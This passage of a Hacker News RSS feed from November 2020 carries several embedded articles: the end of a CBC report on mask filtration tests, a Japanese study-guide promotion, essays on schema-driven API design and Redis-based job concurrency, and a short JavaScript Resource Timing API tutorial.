employees and visitors to the parliamentary precinct, have been wearing valve masks while on duty.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/rayon-mask.jpg 300w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/rayon-mask.jpg 460w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/rayon-mask.jpg 620w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg 780w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/rayon-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg"></p></div><figcaption>One of the rayon masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>In an email, the Parliamentary Protective Service told Marketplace: "The masks issued by the Parliamentary Protective Service (the Service), despite having a valve, meet the criteria outlined by PHAC regarding the appropriate use of non-medical mask or face covering. The Service has since replenished its stock with masks that do not include a breathing valve."</p>  <h2>Other masks to avoid</h2>  <p>The neck gaiter-style mask and bandanas were among the poorest performing when it came to filtration efficiency rates. Scott said the thin, porous materials they are made from is likely the reason they did a poor job filtering out any potentially harmful particles, which is made worse by their loose fit.</p>  <p>A two-layer, 100 per cent rayon mask was also among the worst performing masks Marketplace tested for filtration efficiency.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/gaiter-mask.jpg 300w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/gaiter-mask.jpg 460w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/gaiter-mask.jpg 620w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gaiter-mask.jpg 780w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/gaiter-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gaiter-mask.jpg"></p></div><figcaption>One of the gaiter-style masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Lack of standards, testing for consumer masks</h2>  <p>Physician and infectious diseases specialist Monica Gandhi from the University of California, San Francisco expects mask requirements to be around for the foreseeable future, at least until there is enough of a safe and effective vaccine.&nbsp;</p>  <p>"I have become more and more convinced that they are one of the most important pillars of pandemic control," said Gandhi.&nbsp;</p>  <p>As <em>Marketplace</em>'s research has found that consumer masks protect the wearer in addition to others,&nbsp;public health agencies recently updated their guidelines to include that messaging.</p>  <p>Last week, Health Canada quietly updated its mask-wearing guidelines, adding <a href="https://www.canada.ca/en/public-health/services/diseases/2019-novel-coronavirus-infection/prevention-risks/about-non-medical-masks-face-coverings.html"><u>"to protect yourself and others</u></a>." On Tuesday, the U.S. Centers&nbsp;for Disease Control went further,&nbsp;<a href="https://www.cdc.gov/coronavirus/2019-ncov/more/masking-science-sars-cov2.html"><u>updating its recommendations</u></a> in favour of masking by outlining a number of studies that point to masking as drastically reducing transmission of the disease for both the wearer and others.</p>  <p><strong><em>WATCH | How masks protect not only others, but the wearer, too:</em></strong></p>  <p><span><span><div><div role="button" tabindex="0" title="Mask wearing doesn't only protect others, it also protects you, expert says"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/970/143/CP111461144_1280x720_1818907203591.jpg" alt=""></p></div></div></div><span>An infectious disease specialist cites research that suggests wearing a mask can lead to less severe illness from COVID-19 by limiting how much of the virus someone inhales.<!-- --> <!-- -->0:35</span></span></span></p>  <p>"This is an incredibly exciting update from the CDC since messaging that allows the public to know that masks protect you as well as others will be more powerful in convincing skeptics that masks are important in public spaces to slow down spread and disease from COVID-19,"&nbsp;Gandhi said.&nbsp;</p>  <p>She also made note of research released in September that …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481">https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085480</guid>
            <pubDate>Fri, 13 Nov 2020 18:14:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Essential Japanese: The Mental Model [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25085424">thread link</a>) | @sova
<br/>
November 13, 2020 | https://japanesecomplete.com/guide | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page-wrapper">

			<!-- Header -->
				

			<!-- Content -->
				<section id="content">
					<div>
						<div>
							<div>

								<!-- Left Sidebar -->
									<section>
										<header>
											<h2>Japanese Complete presents</h2>
											<h3>Essential Japanese</h3>
											<h4>Provided free of charge to language learners.</h4>
										</header>
										
										<p>English Sentence Structure</p>
										<p>Japanese Sentence Structure</p>
										<ul><li>Topic</li>
											   <li>Subject</li>
											   <li>Direct-Object</li>
											   <li>Verb</li></ul>
										<p>Particles</p>
										<ul><li>Query Particles</li>
											<li>Elaborative Particles</li></ul>
										<p>Bunsetsu Jars</p>
										<p>Nouns and Verbs</p>
										<p>Sentence-Final Fitters</p>
										<p>Addressing People</p>
										<p>Four Types of Kanji</p>
										</section>
							</div>
							<div>

								<!-- Main Content -->

								
										<section>
											
											<iframe width="500" height="315" src="https://www.youtube.com/embed/8JLasdP65bY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
											<hr>
										<header>
											<a href="https://learnjapanesebest.files.wordpress.com/2020/02/essential_japanese_mental_model_f1r2.pdf">
											<img id="guideimg" src="https://japanesecomplete.com/img/ejc.jpg">	
											<span>[pdf]</span> Essential Japanese: The Mental Model →</a>
											
										</header>
										<p>Essential Japanese: The Mental Model is a guide offered with kindness from Japanese Complete.  Learn the language with the clearest guide available as of 2020. Plus, it's free.</p>
										<p>If you find it useful, share it with a friend. </p><p> It would mean a lot to us if you would tell a friend about Japanese Complete.  We're adding exciting tools and materials with great vigor.</p>

										<p>Learn more about the cutting-edge interactive learning solution, <a href="https://japanesecomplete.com/">Japanese Complete</a></p>

										<h2><a href="https://japanesecomplete.com/win/">Enter our giveaway</a> to win a three-month subscription to the premier Japanese language learning solution, Japanese Complete!</h2><h3>Winners are announced once a month and your chances of winning are 1 in 50!</h3>
								<h2>Or, <a href="https://japanesecomplete.com/purchase">get a premium subscription today,</a> support an education company you love, and dive right in today!</h2>
								<h3>Get a yearly subscription and get two months free.</h3>
								<h2>Learn more in the video below, and get a copy of our free guide above, just click the image.</h2>














										</section>



							</div>
							<div>

								<!-- Right Sidebar -->
									<section>
										<header>
											<h2>Master the Elements of Grammar</h2>
										</header>
										<p>Japanese Particles are what make Japanese unique as a language. When we study Japanese (or Korean for that matter) having a solid understanding of how particles are incorporated and used to reflect and express states of the mind is crucial.</p>
										<p>Japanese Complete focuses on a "Particles First" approach that teaches all the grammatical particles first. This unconventional technique actually enables the most accelerated learning in Japanese ever, because by frequency, particles are the most frequent glyphs of the language.</p>
										<ul>
											<li>Master Japanese Swiftly.</li>
											<li>Retain What you Learn.</li>
											<li>Go All The Way.™</li>	
										</ul>
									</section>
									<section>
										<header>
											<h2>Get Access to the Ninja Training Grounds.</h2>
										</header>
										<p>
											What sets Japanese Complete apart is not just exceptional lessons, but the training grounds. Practice what you learned right away and get your accuracy up and beyond with excellent drills designed to jog with you all the way to fluency.
										</p>
									</section>
									<section>
										<header>
											<h2>Translator-Grade Materials</h2>
										</header>
									<p>Crafted by Translators for Translators, Japanese Complete offers insights into language learning that are simply unavailable elsewhere.</p>
								</section>
							</div>
						</div>
					</div>
				</section>

			<!-- Footer -->
				

			<!-- Copyright -->
				<p>
					© Japanese Complete 2020. All rights reserved.
				</p>

		</div></div>]]>
            </description>
            <link>https://japanesecomplete.com/guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085424</guid>
            <pubDate>Fri, 13 Nov 2020 18:10:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API design is stuck in the past]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 123 (<a href="https://news.ycombinator.com/item?id=25085276">thread link</a>) | @kentonv
<br/>
November 13, 2020 | https://buf.build/blog/api-design-is-stuck-in-the-past | <a href="https://web.archive.org/web/*/https://buf.build/blog/api-design-is-stuck-in-the-past">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>November 12, 2020</p><p>The industry has embraced statically typed languages, but API design remains twenty years in the past. Schema driven development presents an opportunity to pull API design into the present. </p></div></div><div><div><div><p>Two decades ago, it was widely argued that dynamic programming languages were more productive because you didn't have to spend time dealing with type signatures. The only reason, then, to use a statically typed language, was for better performance. Truth be told, at the time, this argument had some validity, and many organizations chose to move away from the Javas of the world, and towards the Pythons. However, this was largely because of the specific statically-typed languages in wide use, and because of a lack of tooling available at the time to support them. </p><p>‍</p><p>By now, that tooling has become much more widely available. In fact, the industry has learned over time that statically typed languages actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability. Editor features like auto-complete and jump-to-definition make programmers much more productive, and are mostly only possible in statically typed languages. We see TypeScript taking off, even though it has no performance benefit over JavaScript, because it is more productive. In addition, larger code bases become easier to manage when everyone is able to have some typed reason about each others’ code,<strong> </strong>resulting in the ability to add features faster, with fewer bugs. In other words, the benefit of maintaining type signatures now well outweighs the cost.&nbsp;&nbsp;</p><blockquote>The industry has learned over time that statically typed languages &nbsp;actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability</blockquote><h3>‍<strong>The status quo for APIs is still freeform</strong></h3><p>When it comes to network APIs, however, the industry is still twenty years behind. Most developers continue to rely on the path of least resistance: defining RESTful services, relying on JSON as the data format and HTTP as the transport protocol. Some feel that dynamically typed JSON, along with loosely-defined REST standards, are more productive than the alternatives, or that the learning curve associated with other API standards is too steep. However, similar to dynamic languages 20 years ago, the status quo of API development leaves a lot of room for improvement.</p><p>‍</p><p>API development today is overwhelmingly freeform. Fundamentally, that means that every company -- and every team within every company -- that claims their services are RESTful can actually have very different API design standards. For example, naming conventions, pagination and versioning could all be radically different on one team compared to another. Often, a team might overload an object with unnecessary fields and use inconsistent data types. Unfortunately, this causes a number of problems.</p><h3>‍<strong>Freeform APIs can cause major problems</strong></h3><p>It’s straightforward to understand why having APIs structured differently harms service grokability. When APIs are designed differently, it’s not always obvious how the service should be used, preventing teams from quickly and confidently building applications around a new service.&nbsp;</p><p>Organizations do make attempts to standardize the service structure, mostly by way of API style guides. Setting a style guide is a headache in and of itself, either requiring a team to craft one or select a popular one. Teams and individuals can rarely agree on a style guide, so this decision often gets ignored and relitigated regularly in code reviews. Ultimately, even if there was internal consensus on an approach to style, there is no good way to enforce, monitor or lint APIs for adherence.</p><p>An inconsistent approach to service design and maintenance has another unintended effect: breaking changes. In a freeform API environment, you can’t fully understand the downstream impacts of making changes to the contract. This works in the opposite direction too; clients with an updated view of the world talking to servers that remain in need of an update, including during rolling updates, can send requests that servers do not understand. There isn’t a good way to work around this as an organization. You either expect that the service will consistently break users, or you develop some sort of internal process to better manage changes to the contract. Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</p><blockquote>Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</blockquote><h3>‍<strong>The opportunity for schema driven development</strong></h3><p>It’s time for the industry to shift from a freeform approach to a world where all APIs are defined programmatically with schemas. Schema driven development solves many of the challenges summarized above. APIs are much easier to grok and can be relied on from day one. Organizations can set and enforce API standards across multiple teams. Service owners can make the changes they need to their service, with more structure in place to prevent breaking clients.&nbsp;</p><p>‍</p><p>This is already a major improvement, but the full opportunity for schemas to improve developer productivity is much greater. Similar to the way that statically typed languages enabled new potential for tools to improve developer productivity, the major promise of schema driven development is the assets that the schema can generate automatically. This is a topic big enough to explore in another article, but suffice it to say, relying on a schema can automate all of the boilerplate code required to actually interact with services.&nbsp;</p><p>‍</p><p>Today, schema driven API protocols are sometimes viewed as something you use only if performance matters. In the same way that typed languages needed tooling to support their adoption, a tooling ecosystem is needed to support the use of schema driven API protocols.&nbsp;</p><p>‍</p><p>We at Buf feel that the best option available today for schema driven development is Protocol Buffers (a topic we’ll explore in a future article), and we’re hard at work building such tooling to support organizations using Protobuf to define their services. We hope that with this kind of tooling, teams will look to API schemas for all-around productivity gains, and not just performance.</p></div></div></div></div>]]>
            </description>
            <link>https://buf.build/blog/api-design-is-stuck-in-the-past</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085276</guid>
            <pubDate>Fri, 13 Nov 2020 18:00:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intro to the Resource Timing API]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25085139">thread link</a>) | @glamp
<br/>
November 13, 2020 | https://www.userbugreport.com/blog/2020/11/01/ | <a href="https://web.archive.org/web/*/https://www.userbugreport.com/blog/2020/11/01/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p><time datetime="2020-11-01T00:00:00.000Z">November 1, 2020  · 4 min read</time></p><div><p><a href="https://github.com/glamp" target="_blank" rel="noreferrer noopener"><img src="https://avatars3.githubusercontent.com/u/1409333?s=460&amp;v=4" alt="Greg Lamp"></a></p></div></header><section><p>In this post we're going to cover something you might not have heard of before but
that could come in really handy--the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API" target="_blank" rel="noopener noreferrer">JavaScript Resource Timing API</a>. This is an API we rely on for User Bug Report that helps collect network request performance
data.</p><center><img src="https://www.userbugreport.com/img/blog/screenshot-network-performance.png"><br>Ever wanted to grab this data? *This* is your chance!</center><h3>How it works</h3><p>Loading a resource in the browser can be broken down into different phases--from initiating
a request all the way to receiving the response. Most of the time you probably don't
care about any of the phases in between. But when you have a performance bottleneck
or are getting 404s in production, your opinion may change.</p><center><a href="https://mdn.mozillademos.org/files/12093/ResourceTiming-TimeStamps.jpg" target="_blank" rel="noopener noreferrer"><img src="https://mdn.mozillademos.org/files/12093/ResourceTiming-TimeStamps.jpg" width="300"></a><br>The phases of a network request.<br><small>Image by MDN is licensed under CC-BY-SA 2.5.</small></center><p>As you can see, your browser is tracking a lot more than just <code>startTime</code> and <code>endTime</code>.</p><h3>How to use it</h3><p>What's cool about the Resource Timing API is there <a href="https://w3c.github.io/resource-timing/" target="_blank" rel="noopener noreferrer">is now a W3C standard</a> which major, modern
browsers are supporting. That means you can use this API without having to include
any JavaScript libraries--pretty handy!</p><p>OK, so how do you <em>actually</em> use this API. From JavaScript, you can access the <code>performance</code>
entries:</p><div><div><div><div><p><span>const</span><span> resources </span><span>=</span><span> </span><span>performance</span><span>.</span><span>getEntriesByType</span><span>(</span><span>"resource"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>resources</span><span>[</span><span>0</span><span>]</span><span>)</span><span>;</span></p></div></div></div></div><img src="https://www.userbugreport.com/img/blog/resource-timing-1.png"><p>You can see there's a lot of interesting info in here. A lot of it is self-explanatory. You're also
going to see a lot of zeroes--some of the things tracked likely won't apply to
every one of your requests. In this example I'm looking at the styles from our blog hosted
on my machine. There are no redirects happening so you can see that both <code>redirectStart</code>
and <code>redirectEnd</code> are both 0.</p><div><div><div><div><p><span>const</span><span> timings </span><span>=</span><span> </span><span>[</span><span>]</span><span>;</span><span></span></p><p><span></span><span>for</span><span> </span><span>(</span><span>const</span><span> resource </span><span>of</span><span> resources</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  timings</span><span>.</span><span>push</span><span>(</span><span>{</span><span></span></p><p><span>    name</span><span>:</span><span> resource</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    initiatorType</span><span>:</span><span> resource</span><span>.</span><span>initiatorType</span><span>,</span><span></span></p><p><span>    redirectTime</span><span>:</span><span> resource</span><span>.</span><span>redirectEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>redirectStart</span><span>,</span><span></span></p><p><span>    dnsTime</span><span>:</span><span> resource</span><span>.</span><span>domainLookupEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>domainLookupStart</span><span>,</span><span></span></p><p><span>    tcpHandshakeTime</span><span>:</span><span> resource</span><span>.</span><span>connectEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>connectStart</span><span>,</span><span></span></p><p><span>    secureConnectionTime</span><span>:</span><span> resource</span><span>.</span><span>connectEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>secureConnectionStart</span><span></span></p><p><span>    responseTime</span><span>:</span><span> resource</span><span>.</span><span>responseEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>responseStart</span><span>,</span><span></span></p><p><span>    fetchUntilResponseEndTime</span><span>:</span><span> resource</span><span>.</span><span>responseEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>fetchStart</span><span></span></p><p><span>    requestStartUntilResponseEnd</span><span>:</span><span> resource</span><span>.</span><span>responseEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>requestStart</span><span></span></p><p><span>    startUntilResponseEnd</span><span>:</span><span> resource</span><span>.</span><span>responseEnd</span><span> </span><span>-</span><span> resource</span><span>.</span><span>startTime</span><span></span></p><p><span>  </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span></p></div></div></div></div><center>Grab the timing metrics you want and put them in an array.</center><p>With all of these fields there are multiple ways you can calculate how long a request takes.
Which method you choose is going to be dependent on the context of your use case--or more likely, what you're debugging!</p><h3>Request Size API</h3><p>Many times going hand in hand with request times are resource sizes. This is something
that can be surprisingly tricky to debug. Luckily for you the Resource Timing API is
here to help.</p><ul><li><code>transferSize</code>: Size of the resource including header--in other words, the whole enchilada, rice and beans included.</li><li><code>encodedBodySize</code>: Size of payload body <strong>before</strong> removing any encoding--the enchilada, rice and beans removed.</li><li><code>decodedBodySize</code>: Size of payload body <strong>after</strong> removing any encodings--the enchilada, rice and beans removed with no Boom-Boom sauce (though I must argue that this defeats the purpose).</li></ul><h3>Before you go</h3><p>If you want to track Resource Timing API data and other useful metrics about your app,
you should check out our product here: <a href="https://www.userbugreport.com/" target="_blank" rel="noopener noreferrer">https://www.userbugreport.com/</a>. It's free to test
out and it costs about as much as a pair of <a href="https://www.chuys.com/uploads/Menus_Combined_resized.pdf" target="_blank" rel="noopener noreferrer">Chicka-Chicka Boom-Boom Enchiladas from Chuy's</a>--and trust us when we say
that User Bug Report has far fewer calories.</p><center><img src="https://i.pinimg.com/originals/5f/50/04/5f5004a29b96a171ecb7ca83e462c276.jpg" width="300"><br>Behold! The Chicka-Chicka Boom-Boom Enchilada.</center><p>Check out these additional resources for more info on the Resource Timing API.</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API" target="_blank" rel="noopener noreferrer">Mozilla Resource Timing Docs</a></li><li><a href="https://w3c.github.io/resource-timing/" target="_blank" rel="noopener noreferrer">W3C Spec</a></li><li><a href="https://www.stevesouders.com/blog/2014/08/21/resource-timing-practical-tips/" target="_blank" rel="noopener noreferrer">Resource Timing practical tips by Steve Souders</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/navigation-and-resource-timings" target="_blank" rel="noopener noreferrer">Assessing Loading Performance in Real Life with Navigation and Resource Timing</a></li></ul></section></article></div>]]>
            </description>
            <link>https://www.userbugreport.com/blog/2020/11/01/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085139</guid>
            <pubDate>Fri, 13 Nov 2020 17:50:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scalable Concurrency Controls for Heterogeneous Workloads]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25085022">thread link</a>) | @todsacerdoti
<br/>
November 13, 2020 | https://blog.pipedream.com/concurrency-controls-design/ | <a href="https://web.archive.org/web/*/https://blog.pipedream.com/concurrency-controls-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Pipedream is a platform for creating event driven sources, and consuming those sources via workflows. &nbsp;As you can imagine, we see a lot of different kind of workloads. &nbsp;We'll take a look at how we initially built our request handling, and how we had to evolve it for this increasingly heterogeneous mix of workloads.</p><h2 id="workloads-tall-and-wide-sources-light-and-heavy-workflows">Workloads: tall and wide sources, light and heavy workflows</h2><p>Let's take a look at two common types of workloads we see. &nbsp;Scheduled sources (like a twitter source) will emit many events all at once, but then have a long pause where they will not emit anything at all. &nbsp;Let's call these tall sources. &nbsp;Wide sources in contrast are things like busy http sources, where there are events in a steady (but possibly uneven) flow.</p><figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/0hu6sm2qmppzsjsoywpa.png" alt="Tall Source"></figure><figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/0qt82u654vogzpber6hp.png" alt="Wide Source"></figure><p>When they are consumed by workflows, the workflow code can either be light, something like send a message to Slack, or something heavier, like enriching data for ETL before inserting into a data lake. &nbsp;Light workflows durations are less than a second, and are relatively predictable, heavy workflows can take minutes, and can vary widely. &nbsp;Of course, you can have anything in between.</p><p>For the purposes of this post, let's say that the tall source is consumed by a light workflow and the wide source is consumed by the a heavy workflow.</p><h2 id="kinesis-based-job-process">Kinesis based job process</h2><figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/t37d0ixjl74to14x0o1x.png" alt="Alt Text"></figure><p>Our initial request handling architecture our sources create a job for each emit and insert them into a random Kinesis shard. &nbsp;Job processors then use <a href="https://github.com/awslabs/amazon-kinesis-client">KCL</a> to pick up the request and run workflow. &nbsp;This scales incredibly well, add more HTTP servers, Kinesis shards and job processors as request volume grows. &nbsp;However we hit 2 big problems as we grew the platform.</p><h3 id="problem-1-non-linear-delivery">Problem 1 - Non-linear delivery</h3><p>You may have not noticed, but I slipped a very important detail in the summary '<em>random</em> Kinesis shard.' &nbsp;The random shard allows us to distribute all the requests evenly over all the shards and job processors. This makes sure that every shard is loaded evenly. &nbsp;However for our tall sources, that means that all the emits will get spread over all the shards. &nbsp;While this is great if you want to get everything done as soon as possible, sometimes you want to be sure you are processing things one at a time, like when talking to a downstream service where racing changes could overwrite each other. &nbsp;In the diagram you can see JT2 and JT3 running at the same time.</p><p>Wide sources have a similar problem, some later emits can actually get processed earlier than later emits, particularly on heavy workflows. &nbsp;(JW4 actually starts before JW3). &nbsp;You may want to force an in order delivery.</p><h3 id="problem-2-kinesis-shard-handoffs">Problem 2 - Kinesis shard handoffs</h3><p>This problem is low-level and specific to KCL, so feel free to skip to the next section and take it on my word that KCL has some real big problems when you need to restart shard processors. &nbsp;The KCL library, while fine in the steady state, has some problems when it comes time for a job processor to give up its lease and another one to pick it up. &nbsp;Though tunable, at best the default settings take about 20 seconds after a processor gives up its lease for another job processor to notice and pick it up. &nbsp;Tune that downwards and you end up increasing your dynamo costs. &nbsp;Worse, the nature of how kinesis handles checkpointing leads to a bigger problem.</p><p>KCL only allows you one checkpoint per shard (this stems from the fact that the underlying Kinesis data stream is very much a stream and does not allow easy random access). &nbsp;This is fine when you are dealing with short lived homogenous tasks, but since we allow tasks to run up to 5 minutes, the shard is often times in a situation like below where a heavy workflow is mixed with a light workflow:</p><figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/0cdryxf5e04cskd25jxs.png" alt="Alt Text"></figure><p>All the green jobs have finished, but the long job B is still running. &nbsp;Now imagine you get a shutdown signal, you now have 3 unsavory choices:</p><ul><li>Checkpoint Job A and release the lease. &nbsp;This allows the new job processor to start immediately (modulo the above timing constraint), however it will now need to re-run Job B through Job C, which will mean duplicate events.</li><li>Checkpoint Job C and release the lease. &nbsp;The handoff is immediate again, but Job B is aborted, and won't be re-run.</li><li>Wait until Job B is done, and checkpoint. &nbsp;Everything is run once to completion, but the hidden cost here is that the shard will now be un-serviced for 5 minutes. &nbsp;We have stopped servicing on the old processor, but can't hand off to the new processor. &nbsp;Meanwhile, jobs are still coming into this shard, so anyone unlucky enough to be routed to this shard will up to a 5 minute delay in their job starting!</li></ul><p>Since we are a CI/CD shop, we deploy many times a day, so these handoff issues are a real pain point.</p><h2 id="redis-stream-per-workflow">Redis Stream per workflow</h2><figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/c0399m58hiy9y98mlon1.png" alt="Alt Text"></figure><p>To solve both the problems, we decided to implement a queue per workflow. &nbsp;Kinesis is not meant to scale this way (you are limited in the number of data streams you can create, and streams don't scale down cost-wise to the low throughput workflows that many of our users use), so we had to build something on our own. &nbsp;We already used a lot of Redis so it was natural to use <a href="https://redis.io/topics/streams-intro">Redis Streams</a> as our new message bus.</p><p>When a request comes in, it gets written to its own Redis stream based on the source or workflow, and then we ping a broker to make sure that that queue is being managed by one (and only one) process, we call this creating a lease for a tenant.</p><p>Every tenant looks for new leases when it has cycles to spare, and once it has the lease, it has the exclusive access to the redis stream which contain the jobs. &nbsp;In this case it uses that exclusive access to feed jobs to the job processors.</p><p>An idle job processor will pick it up that job, read the event from the Redis stream, run the workflow, and signal back to the tenant when the job is completed.</p><h3 id="solution-1-linear-delivery">Solution #1: Linear Delivery</h3><p>To enforce linear delivery, the tenant will only feed a job to a job processor one at a time, meaning it will wait for that job completion signal before sending the next one in the queue.</p><h3 id="solution-2-smooth-handoffs">Solution #2: Smooth Handoffs</h3><p>Since the architecture has more parts, that has to result in a more complex handoff story right? &nbsp;Wrong. &nbsp;Let's break it down by each subsystem.</p><h4 id="brokers">Brokers</h4><p>Okay, I was exaggerating a bit when I said we pinged a broker. &nbsp;All this ping is a set membership check on Redis set, to see if a lease is allocated, and if it isn't it creates a lease, which is (surprise!) an entry in a Redis Stream. &nbsp;That logic can be encapsulated in a lua script on Redis itself, so there are no actual broker servers, nor any state to hand off.</p><h4 id="tenants">Tenants</h4><p>We take great pains in making sure that any state that tenants are using to run the queues are actually persisted in Redis as well (Redis Streams itself provides a lot of this out of the box). &nbsp;During an orderly shutdown, a tenant will vacate its lease, which will allow another tenant to pick it up immediately with all its associated state. Even in failure cases, a tenant will get its leases evicted and another tenant can take it over with its current state.</p><h4 id="job-processors">Job Processors</h4><p>Job processors are agnostic to the jobs they are consuming, they just take the next available job and run it. &nbsp;Since Redis Streams allow every job to be <a href="https://redis.io/commands/xack">XACK</a>(nowledged) separately, it doesn't suffer from the problems of only being able to checkpoint one point of the stream. When job processors need to be restarted, they stop accepting jobs and finish the ones that it is working on. &nbsp;Doing so does not block any other progress, since new jobs will be serviced by other available job processors.</p><h3 id="scalability">Scalability</h3><p>As mentioned in the preface, Kinesis scales incredibly well. &nbsp;How does this system fare? &nbsp;Again, let's break it down by subsystem</p><h4 id="broker">Broker</h4><p>Remember, brokers are actually just lua scripts running on Redis. &nbsp;It's 1 op when the lease is already assigned, and 5 ops when the lease needs be created (this is including the operations that the tenant needs to do when it acquires a lease). &nbsp;However, since request volume dwarfs the number of active sources, it's effectively one op per request. &nbsp;This can be furthered optimized via some simple client side caches. &nbsp;If necessary we could shard Redis by source, but since Redis can scale to 500k ops/sec/shard, one shard goes a long long way. &nbsp;The memory requirements are also tiny, since we are not holding request data here, just a little bit of metadata.</p><h4 id="tenants-1">Tenants</h4><p>Tenants are also very memory efficient, they only use the queue states, not any event data, since that's all stored in Redis. &nbsp;To scale the Redis Streams, we make use of Redis Cluster, sharding the streams by workflow.</p><h2 id="more-features-">More features!</h2><p>This design can be used to do all sorts of other interesting things other than serial delivery that would've been impossible using Kinesis. &nbsp;The first two we've added is rate limiting and scheduled delivery. &nbsp;Both cases are again making sure that we store the state for each (which boils down to the next time we can run a job) in Redis, and setting timers in the tenant about when to send the message to a job processor.</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.pipedream.com/concurrency-controls-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085022</guid>
            <pubDate>Fri, 13 Nov 2020 17:41:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[30+ git commands that I frequently use]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25085012">thread link</a>) | @pbteja1998
<br/>
November 13, 2020 | https://blog.bhanuteja.dev/30-git-commands-that-i-frequently-use | <a href="https://web.archive.org/web/*/https://blog.bhanuteja.dev/30-git-commands-that-i-frequently-use">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><h2 id="hello-world">Hello World 👋</h2>
